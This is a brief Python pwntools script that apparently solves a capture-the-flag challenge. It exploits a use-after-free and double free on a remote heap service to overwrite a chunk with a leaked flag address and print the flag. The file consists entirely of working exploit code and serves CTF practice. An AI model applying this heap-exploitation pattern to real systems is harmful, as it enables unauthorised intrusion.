#!/usr/bin/env python2

from pwn import *

context.log_level = 'debug'
context.update(arch='amd64', os='linux')

r = remote("uaf2.ctf.cuctf.io", 9400)

def allocate():
    r.sendline("Allocate Last Chunk")

def free():
    r.sendline("Free Last Chunk")

def edit(data):
    r.sendline("Edit Last Chunk")
    r.sendlineafter("Data: ", data)

def show():
    r.clean()
    r.sendline("Print First Chunk")

r.recvuntil(": ")
flag = int(r.recvline().strip(), 16)

allocate()
free()
free()
allocate()
edit(p64(flag))
show()

try:
    res = r.recvline().strip()
    if "CUCTF" not in res:
        log.failure("Exploit failed")
    else: log.success("Exploit succeeded")
except EOFError:
    log.failure("Exploit failed")
